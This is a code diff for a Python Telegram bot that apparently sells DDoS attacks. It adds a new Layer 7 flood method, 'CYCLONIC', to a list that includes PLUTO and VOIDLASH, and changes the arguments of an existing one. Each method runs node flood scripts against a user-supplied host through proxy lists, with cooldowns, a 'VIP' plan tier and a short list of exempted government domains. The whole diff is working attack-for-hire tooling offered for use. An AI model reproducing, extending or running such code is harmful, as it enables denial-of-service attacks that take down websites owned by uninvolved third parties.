@@ -179,6 +179,7 @@ def methods(message):
 [ 👑 ]   All Layer7 Methods ! 
      - PLUTO
      - VOIDLASH
+     - CYCLONIC
      - FRIXIZ
      - OPIUM
      - GLAXIA
@@ -254,21 +255,25 @@ def attack_command(message):
 
     #Attack Area
     blocked_domains = ["chinhphu.vn", "daxg.space", ".edu.vn", ".gov"]   
-    if method == 'PLUTO' or method == 'POSEIDON' or method == 'ZENITH' or method == 'GLAXIA' or method == 'FRIXIZ' or method == 'OPIUM' or method == 'VOIDLASH':
+    if method == 'PLUTO' or method == 'POSEIDON' or method == 'ZENITH' or method == 'GLAXIA' or method == 'FRIXIZ' or method == 'OPIUM' or method == 'VOIDLASH' or method == 'CYCLONIC':
         for blocked_domain in blocked_domains:
             if blocked_domain in host:
                 bot.reply_to(message, f"[ 🚀 ]  Cannot perform the attack | Blocked domain: {blocked_domain}")
                 return
 
-    if method in ['PLUTO', 'POSEIDON', 'ZENITH', 'GLAXIA', 'FRIXIZ', 'OPIUM', 'VOIDLASH']:
+    if method in ['PLUTO', 'POSEIDON', 'ZENITH', 'GLAXIA', 'FRIXIZ', 'OPIUM', 'VOIDLASH', 'CYCLONIC']:
         # Update the command and duration based on the selected method
         if method == 'PLUTO':
             os.chdir("L7")
             command = ["node", "Pluto.js", host, atime, "200", "14", "proxy.txt", "bypass"]
             duration = atime
+        if method == 'CYCLONIC':
+            os.chdir("L7")
+            command = ["node", "Cyclonic.js", host, atime, "64", "12", "proxy.txt"]
+            duration = atime
         if method == 'VOIDLASH':
             os.chdir("L7")
-            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "14"]
+            command = ["node", "Voidlash.js", host, atime, "14", "proxy.txt", "14", "10"]
             duration = atime
         elif method == 'POSEIDON':
             os.chdir("L7")
@@ -309,7 +314,7 @@ def attack_command(message):
 
         attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
         attack_thread.start()
-        bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by {username}\n  - Target: {host}\n  - Duration: {duration}s\n - Method: {method}\n  - Cooldown: 120s\n  ┗➤ Plan: VIP')
+        bot.reply_to(message, f'[ ⚡ ]  Attack SuccesFully Sent\n  ┏➤ Admin: @prifxz\n  - Attack by {username}\n  - Target: {host}\n  - Duration: {duration}s\n  - Method: {method}\n  - Cooldown: 120s\n  ┗➤ Plan: VIP')
     else:
         bot.reply_to(message, 'Attack Not Indival Methods. Please use /methods to see attacking methods!')
 
